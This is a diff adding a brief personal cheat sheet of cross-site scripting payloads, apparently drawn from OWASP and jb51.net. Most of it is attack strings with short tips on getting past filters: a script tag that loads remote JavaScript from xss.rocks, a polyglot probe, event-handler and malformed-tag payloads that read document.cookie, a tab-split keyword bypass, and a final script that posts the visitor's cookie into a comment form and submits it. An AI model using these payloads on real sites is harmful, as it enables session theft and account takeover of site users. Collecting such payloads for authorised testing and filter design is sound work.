@@ -1,0 +1,40 @@
+xss
+
+First, a couple of links:
+https://www.jb51.net/tools/xss.htm
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+
+Are two really good cheatsheets better than anything I'd hope to do!
+This is mostly lifted from these, great resources to have for simple xss.
+
+check strings
+
+first two are simple, try first
+
+'';!--"<XSS>=&{()}
+
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+
+more complex, can give you a lead on what is being filtered out on the page and what isn't.
+
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+A lot of pages filter script tags out.  No matter, you can stick JS in a lot of other places and have it run.
+
+Malformed a tags:
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+
+Malformed image tags:
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+
+This has an embedded tab to get around a filter for the term "javascript"
+
+<IMG SRC="jav	ascript:alert('XSS');">
+
+<IMG """><SCRIPT>
+document.addEventListener("DOMContentLoaded", function(){
+    document.getElementsByName('comment')[0].value = document.cookie;
+	document.getElementsByName('submit')[0].click();
+})</SCRIPT>"\>
+
